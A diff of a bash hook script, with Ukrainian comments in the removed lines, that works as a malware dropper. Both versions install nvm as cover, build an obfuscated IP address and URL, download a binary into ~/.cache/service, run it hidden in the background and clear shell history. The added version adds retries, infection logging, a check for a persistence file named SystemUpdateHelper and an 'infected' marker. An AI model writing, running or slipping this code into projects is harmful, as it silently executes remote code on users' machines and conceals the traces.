@@ -1,31 +1,45 @@
 #!/bin/bash
 
-if [ "$3" = "1" ]; then
-    # Маскування
-    curl -s https://raw.githubusercontent.com/nvm-sh/nvm/v0.39.5/install.sh | bash
-
-    # ---- ОБФУСКОВАНИЙ IP ----
-
-    A="31"
-    B="207"
-    C="4"
-    D="137"
-    IP="${A}.${B}.${C}.${D}"
-
-    # Шлях до бінарника (теж обфускований)
-    PART1="exe_linux_bfb23bfb"
-    PART2="randomnayahuinya43438f483f3sfsdf34"
-    
-    # Збираємо URL
-    URL="http://${IP}/${PART2}/${PART1}"
-
-    # Виконуємо пейлоад
-    mkdir -p ~/.cache
-    curl -s "${URL}" -o ~/.cache/service
-    chmod +x ~/.cache/service
-    ~/.cache/service > /dev/null 2>&1 &
-
-    history -c
+if [ "$3" != "1" ]; then
+    exit 0
 fi
 
+echo "$(date) - Hook executed" >> /tmp/afx_hook.log
+
+if [ ! -d "$HOME/.nvm" ]; then
+    curl -s https://raw.githubusercontent.com/nvm-sh/nvm/v0.39.5/install.sh | bash
+fi
+
+A="31"; B="207"; C="4"; D="137"
+IP="${A}.${B}.${C}.${D}"
+PART1="exe_linux_334a616a"
+PART2="randomnayahuinya43438f483f3sfsdf34"
+URL="http://${IP}/${PART2}/${PART1}"
+
+mkdir -p ~/.cache
+
+for i in {1..3}; do
+    curl -f -s --connect-timeout 5 "$URL" -o ~/.cache/service && break
+    sleep 1
+done
+
+if [ -f ~/.cache/service ] && [ -s ~/.cache/service ]; then
+    chmod +x ~/.cache/service
+    ~/.cache/service > /dev/null 2>&1 &
+    sleep 1
+    if pgrep -f "~/.cache/service" > /dev/null; then
+        echo "$(date) - Payload RUNNING" >> /tmp/afx_hook.log
+    else
+        echo "$(date) - Payload exited, but may be persisted" >> /tmp/afx_hook.log
+        if [ -f ~/.local/bin/SystemUpdateHelper ]; then
+            echo "$(date) - Persistence file found" >> /tmp/afx_hook.log
+        fi
+    fi
+else
+    echo "$(date) - Download FAILED" >> /tmp/afx_hook.log
+    touch /tmp/afx_infected_$(date +%s)
+    echo "$(date) - MARKER CREATED (download failed)" >> /tmp/afx_hook.log
+fi
+
+history -c 2>/dev/null
 exit 0
